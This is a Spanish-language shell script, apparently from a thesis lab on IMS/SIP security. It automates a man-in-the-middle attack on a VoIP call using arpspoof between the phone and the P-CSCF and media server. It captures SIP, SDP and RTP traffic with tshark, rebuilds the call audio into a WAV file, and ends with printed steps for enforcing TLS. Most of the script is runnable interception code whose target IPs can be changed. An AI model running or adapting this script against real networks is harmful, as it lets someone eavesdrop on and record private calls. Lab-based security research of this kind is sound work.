#!/bin/sh
# ============================================================================
# v1_mitm.sh — V1 Intercepción SIP/SDP (CVSS 9.1, MITRE T1557).
# MITM por ARP spoofing entre UE y P-CSCF + captura INVITE/SDP/RTP en claro.
# Fases: 1-recon (svmap) 2-config (TLS?) 3-explotación (ARP+MITM) 4-contramedida.
# Uso: ./v1_mitm.sh  (pregunta parámetros; entre [] el valor probado)
# Requiere: lab UP (lab-up.sh) y contenedor kali.
# Evidencia: /root/results/v1_mitm_sip_<TS>.pcapng (volumen -> results/) + hash.
# ============================================================================
set -eu
cd "$(dirname "$0")/.."
export MSYS_NO_PATHCONV=1

log() { echo "[v1] $*"; }
ask() {
  printf "%s [%s]: " "$2" "$3" >&2
  read -r ans || ans=""
  [ -n "$ans" ] || ans="$3"
  echo "$ans"
}
need_kali() {
  docker ps --format "{{.Names}}" 2>/dev/null | tr -d '\r' | grep -qx kali \
    || { log "ERROR: kali no corre (docker compose up -d kali)"; exit 1; }
}
ensure_results() { mkdir -p results; touch results/hashes.txt 2>/dev/null || true; }

# kali no trae pkill/ps: se mata por /proc/cmdline.
kallikill() {
  docker exec -e KILLPAT="$1" kali sh -c 'for p in /proc/[0-9]*/cmdline; do if grep -qa "$KILLPAT" "$p" 2>/dev/null; then pid=${p#/proc/}; kill "${pid%/cmdline}" 2>/dev/null; fi; done' >/dev/null 2>&1 || true
}
cleanup() {
  log "Limpiando (matar arpspoof/tshark)..."
  kallikill arpspoof
  kallikill tshark
  docker exec kali sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward" >/dev/null 2>&1 || true
}
# IFACE/UE_IP/PCSCF se definen abajo; el trap se instala después del ask.

need_kali
ensure_results

UE_IP=$(ask UE_IP "IP del UE victima" "172.20.0.5")
PCSCF=$(ask PCSCF "IP del P-CSCF" "172.20.0.6")
MEDIA=$(ask MEDIA "IP del media server (RTP UE<->Asterisk)" "172.20.0.7")
IFACE=$(ask IFACE "Interfaz en kali" "eth0")
DUR=$(ask DUR "Duración máx captura si no pulsa Enter (s, 0=manual)" "0")
TS=$(date -u +%Y%m%dT%H%M%SZ)
PCAP="/root/results/v1_mitm_sip_$TS.pcapng"
trap cleanup INT TERM EXIT

# --- Fase 1: reconocimiento pasivo ---
log "F1 recon: svmap contra P-CSCF $PCSCF..."
docker exec kali svmap "$PCSCF" 2>/dev/null | head -n 10 || log "(svmap sin respuesta, sigo)"

# --- Fase 2: análisis de configuración (¿TLS exigido?) ---
log "F2 config: ¿P-CSCF exige TLS? (esperado: NO en lab vulnerable)"
grep -a -iE "tls|5061|tls_required" kamailio/pcscf/pcscf.cfg | head -n 5 || log "(sin TLS en pcscf.cfg = vulnerable)"

# --- Fase 3: explotación ---
log "Activando ip_forward en kali..."
docker exec kali sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
log "MITM señalización $UE_IP <-> $PCSCF + media $UE_IP <-> $MEDIA por $IFACE..."
docker exec -d kali arpspoof -i "$IFACE" -t "$UE_IP" "$PCSCF" >/dev/null 2>&1
docker exec -d kali arpspoof -i "$IFACE" -t "$PCSCF" "$UE_IP" >/dev/null 2>&1
docker exec -d kali arpspoof -i "$IFACE" -t "$UE_IP" "$MEDIA" >/dev/null 2>&1
docker exec -d kali arpspoof -i "$IFACE" -t "$MEDIA" "$UE_IP" >/dev/null 2>&1
sleep 2
i=0; while [ "$i" -lt 10 ]; do docker exec kali sh -c "pidof arpspoof >/dev/null" 2>/dev/null && break; sleep 1; i=$((i + 1)); done
docker exec kali sh -c "pidof arpspoof >/dev/null" || { log "ERROR: arpspoof no arrancó"; exit 1; }
# Filtro de captura BPF: 'rtp' NO es válido en BPF (es display filter).
# Se captura todo UDP (con MITM activo pasa por kali: SIP + RTP).
docker exec -d kali tshark -i "$IFACE" -w "$PCAP" -f "udp" >/dev/null 2>&1
i=0; while [ "$i" -lt 10 ]; do docker exec kali sh -c "pidof tshark >/dev/null" 2>/dev/null && break; sleep 1; i=$((i + 1)); done
docker exec kali sh -c "pidof tshark >/dev/null" || { log "ERROR: tshark no arrancó"; exit 1; }
if [ "$DUR" = "0" ]; then
  log "Capturando en $PCAP. Inicie una llamada (1001->1000) y presione Enter..."
  read -r _
else
  log "Capturando $DUR s en $PCAP. Inicie una llamada (1001->1000) ahora..."
  sleep "$DUR"
fi
kallikill arpspoof
kallikill tshark
sleep 2
trap - INT TERM EXIT
docker exec kali sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward" >/dev/null 2>&1 || true
docker exec kali sh -c "test -f $PCAP" || { log "ERROR: tshark no escribió $PCAP (ver filtro/permisos)"; exit 1; }

N=$(docker exec kali tshark -r "$PCAP" -Y sip.Method==INVITE 2>/dev/null | wc -l)
SDP=$(docker exec kali tshark -r "$PCAP" -Y sdp 2>/dev/null | wc -l)
RTPN=$(docker exec kali tshark -r "$PCAP" -Y rtp 2>/dev/null | wc -l)
log "INVITEs capturados: $N | paquetes SDP: $SDP | paquetes RTP: $RTPN"
if [ "$N" -gt 0 ]; then
  log "--- SDP en claro (c= / m=) ---"
  docker exec kali tshark -r "$PCAP" -Y sdp -T fields -e sdp.connection_info -e sdp.media 2>/dev/null | head -n 5
  log "--- streams RTP (decode) ---"
  docker exec kali tshark -r "$PCAP" -q -z rtp,streams 2>/dev/null | head -n 8
  log "--- Reconstrucción audio (reemplazo rtpbreak: tshark + stdlib) ---"
  docker cp attacks/v1_mitm_sip/rtp_to_wav.py kali:/root/rtp_to_wav.py
  WAV="/root/results/v1_audio_$TS.wav"
  docker exec kali sh -c "tshark -r $PCAP -Y rtp -T fields -e rtp.ssrc -e rtp.p_type -e rtp.payload > /tmp/rtp.txt 2>/dev/null; wc -l < /tmp/rtp.txt"
  if docker exec kali python3 /root/rtp_to_wav.py /tmp/rtp.txt "$WAV"; then
    HW=$(docker exec kali sh -c "sha256sum $WAV | cut -d' ' -f1")
    echo "$HW  $(basename "$WAV")  V1-audio  $(date -u +%Y-%m-%dT%H:%M:%SZ)  RTP G711 reconstruido MITM $UE_IP-$PCSCF" >> results/hashes.txt
    log "audio registrado: $(basename "$WAV") (evidencia §5.1 tesis: .wav)."
  else
    log "Sin audio reconstruible (ver streams RTP arriba; rtpbreak tampoco disponible en kali)."
  fi
  H=$(docker exec kali sh -c "sha256sum $PCAP | cut -d' ' -f1")
  echo "$H  $(basename "$PCAP")  V1  $(date -u +%Y-%m-%dT%H:%M:%SZ)  MITM ARP $UE_IP-$PCSCF/$MEDIA ($N INVITE, $SDP SDP, $RTPN RTP)" >> results/hashes.txt
  log "hash registrado."
  if [ "$SDP" -gt 0 ]; then
    log "VEREDICTO: VULNERABLE (SDP en claro, sin TLS)."
  else
    log "VEREDICTO: PARCIAL (hay INVITE pero sin SDP; revisar filtro/llamada)."
  fi
else
  log "Sin INVITEs: repita con llamada activa durante la captura."
fi

# --- Fase 4: contramedida (guía, no aplica sola) ---
log "F4 contramedida: TLS obligatorio en P-CSCF (módulo tls.so ya compilado en kamailio-ims):"
log "  1. Verificar: docker exec kamailio ls /usr/local/lib64/kamailio/modules/tls.so"
log "  2. Generar cert: openssl req -x509 -newkey rsa:2048 -keyout tls.key -out tls.crt -days 825 -nodes -subj '/CN=pcscf.ims.mnc070.mcc999.3gppnetwork.org'"
log "  3. En pcscf.cfg: loadmodule tls.so + listen=tls:172.20.0.6:5061 + modparam tls config; forzar solo-TLS rechazando udp:4060 en request_route."
log "  4. Reiniciar kamailio + re-ejecutar este script: se espera TLS ilegible (0 INVITE en claro)."
